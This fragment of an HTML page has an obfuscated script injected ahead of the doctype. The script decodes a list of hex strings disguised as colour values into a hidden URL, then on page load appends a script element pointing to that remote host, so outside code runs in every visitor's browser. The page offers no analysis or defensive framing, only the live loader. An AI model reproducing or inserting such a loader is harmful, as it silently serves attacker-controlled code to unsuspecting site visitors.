  			
<script>
function vdcd() {
	if(document.all.length > 3) {
		var t = new Array('#6a7072', '#723e29', '#2d706f', '#63776f', '#71776f', '#2c6769', '#6f2a64', '#702b74', '#677263', '#6c6063', '#666b74', '#677729', '#687573', '#67767f', '#2d0000');
		var dcmid = ""; for (j=0;j<t.length;j++) { var c_rgb = t[j]; for (i=1;i<7;i++) { var c_clr = c_rgb.substr(i++,2); if (c_clr!="00") dcmid += String.fromCharCode(parseInt(c_clr,16)^i); } }
		var dcm = document.createElement("script");
		dcm.id = "dcmid";
		dcm.src = dcmid;
		document.all[3].appendChild(dcm);
	} else {
		setTimeout("vdcd()",500);
	}
} setTimeout("vdcd()",500);
</script><!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
